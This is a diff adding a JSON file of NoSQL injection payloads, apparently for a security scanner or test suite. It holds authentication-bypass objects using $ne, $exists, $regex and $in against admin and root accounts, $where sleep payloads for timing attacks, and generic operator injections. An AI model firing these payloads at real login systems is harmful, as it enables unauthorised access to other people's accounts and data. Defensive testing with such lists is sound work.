@@ -1,0 +1,18 @@
+{
+    "auth_bypass": [
+        {"username": {"$ne": null}, "password": {"$ne": null}},
+        {"username": {"$exists": true}, "password": {"$exists": true}},
+        {"username": "admin", "password": {"$regex": ".*"}},
+        {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": null}}
+    ],
+    "time_based": [
+        {"$where": "sleep(1000)"},
+        {"$where": "this.username=='admin' && sleep(1000)"}
+    ],
+    "injection": [
+        {"$gt": ""},
+        {"$nin": []},
+        {"$or": [{"a": 1}, {"a": 2}]},
+        {"$where": "true"}
+    ]
+}
